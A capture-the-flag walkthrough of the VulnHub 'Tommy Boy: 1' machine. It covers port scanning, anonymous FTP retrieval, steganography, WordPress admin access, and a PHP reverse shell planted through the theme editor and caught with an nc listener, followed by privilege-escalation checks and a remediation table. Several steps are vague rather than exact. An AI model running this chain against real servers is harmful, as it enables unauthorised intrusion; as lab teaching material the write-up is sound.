# Tommy Boy: 1 — Writeup

| | |
|-|-|
| **Target IP** | 192.168.56.X (host-only) |
| **Difficulty** | Beginner-Intermediate |
| **OS** | Linux |
| **Flags** | 4 flags across a chain of puzzles |
| **Source** | [VulnHub](https://www.vulnhub.com/entry/tommy-boy-1,157/) |

## Attack Summary

`nmap` → web recon (clue in source) → FTP anonymous → steganography (steghide) → WordPress admin → Theme Editor PHP shell → low-priv shell → SUID/cron → root

## Methodology

1. Network discovery and port scan
2. Web recon: page source hints at FTP
3. FTP anonymous login, download files
4. Steganography: steghide on downloaded image
5. WordPress credential chain
6. PHP reverse shell via theme editor
7. Privilege escalation

---

## Step 1: Network Discovery

```bash
sudo netdiscover -i eth1 -r 192.168.56.0/24
nmap -sV -sC -p- <TARGET_IP>
```

Open ports:
- 22/tcp — SSH
- 80/tcp — HTTP (Apache + WordPress)
- 8008/tcp — HTTP (alternate web)
- 65534/tcp — FTP (non-standard port)

---

## Step 2: Web Enumeration

Browse `http://<TARGET_IP>` — a page themed around the Tommy Boy movie. View the page source to find a comment hinting at FTP credentials or a username.

```bash
curl -s http://<TARGET_IP>/ | grep -i "<!--\|ftp\|nick\|password"
```

Also enumerate WordPress:

```bash
wpscan --url http://<TARGET_IP>/ --enumerate u,p
```

---

## Step 3: FTP Anonymous Login

```bash
ftp <TARGET_IP> 65534
# Username: nickburns
# Password: (found from web source or blank)
ls -la
get ssh-badkeys
get .sysnotes.txt
mget *.png *.jpg 2>/dev/null
```

Download any images or notes. The `.sysnotes.txt` may contain password hints.

---

## Step 4: Steganography

```bash
steghide extract -sf <downloaded_image>.jpg
# Passphrase: (from .sysnotes.txt or web clue)
cat embedded_file.txt
```

The extracted text reveals the next credential or a clue to the WordPress password.

---

## Step 5: WordPress Admin Access

```bash
# Try recovered credentials at:
http://<TARGET_IP>/wp-login.php
```

**Credentials found through the chain:** `tommy` / `<recovered_password>`

---

## Step 6: PHP Reverse Shell

In WordPress admin, go to **Appearance → Editor → 404.php** (or `functions.php`). Replace with PentestMonkey PHP shell.

```bash
nc -lvp 4444
```

Trigger: `http://<TARGET_IP>/wp-content/themes/<theme>/404.php`

Upgrade the shell:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Step 7: Privilege Escalation

Check common vectors:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
```

The VM uses either a writable cron script or a SUID binary to escalate to root.

```bash
cat /root/flag.txt
```

---

## Lessons Learned

1. **Page source comments** often contain developer notes with credentials or file paths — always check source
2. **Non-standard port FTP** is easily missed without a full port scan (`-p-`)
3. **Steganography** as a password vector is uncommon in production but demonstrates the need to audit all uploaded files
4. **WordPress theme editor** gives direct PHP execution — keep it disabled in production (add `define('DISALLOW_FILE_EDIT', true)` to `wp-config.php`)

## Remediation

| Vulnerability | Fix |
|---|---|
| Credentials in HTML source | Remove developer comments before deployment |
| FTP with credentials on non-standard port | Disable FTP; use SFTP over SSH |
| WordPress theme editor enabled | `define('DISALLOW_FILE_EDIT', true)` in `wp-config.php` |
| Weak WordPress password | Enforce strong passwords; enable 2FA |
